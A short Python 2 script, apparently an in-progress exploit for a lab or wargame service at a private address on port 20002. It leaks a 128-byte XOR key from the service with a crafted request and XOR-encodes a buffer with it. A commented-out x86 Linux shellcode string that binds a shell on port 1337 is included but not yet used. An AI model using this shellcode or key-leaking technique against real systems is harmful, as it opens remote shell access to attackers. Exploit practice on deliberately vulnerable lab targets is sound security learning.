import socket
import binascii
import struct

#shellcode = "\x31\xc0\x31\xdb\x50\xb3\x01\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80\x89\xc7\x31\xf6\x56\x66\x68\x05\x39\x66\x6a\x02\x89\xe1\x6a\x10\x51\x57\x89\xe1\xb3\x02\xb0\x66\xcd\x80\x6a\x01\x57\x89\xe1\xb3\x04\xb0\x66\xcd\x80\x31\xc0\x50\x50\x57\x89\xe1\xb3\x05\xb0\x66\xcd\x80\x89\xc7\x89\xfb\x31\xc9\xb0\x3f\xcd\x80\x41\x83\xf9\x03\x75\xf6\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x31\xd2\x31\xf6\x89\xe1\xb0\x0b\xcd\x80"


def get_key(s):
  key_request = "E" + "\x80\x00\x00\x00" + "\x00"*128

  response = s.recv(255)
  response += s.recv(1)
  print response

  print binascii.hexlify(key_request) +"\n"
  s.send(key_request)

  response = s.recv(255)
  response += s.recv(1)
  print response

  response = s.recv(4)
  print "key length:", struct.unpack("<I", response)[0]

  response = s.recv(128)
  key = list(struct.unpack("<32I", response))
  print "key: ",key,"\n"

  return key


def encode(buff, key):
   for i in xrange(len(buff)):
      buff[i] ^= key[i%32]

   print "Encoded Buffer:\n", buff, "\n"
   return

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('192.168.56.101', 20002))


key = get_key(s)

buff = [0,0,0,0]
encode(buff, key)



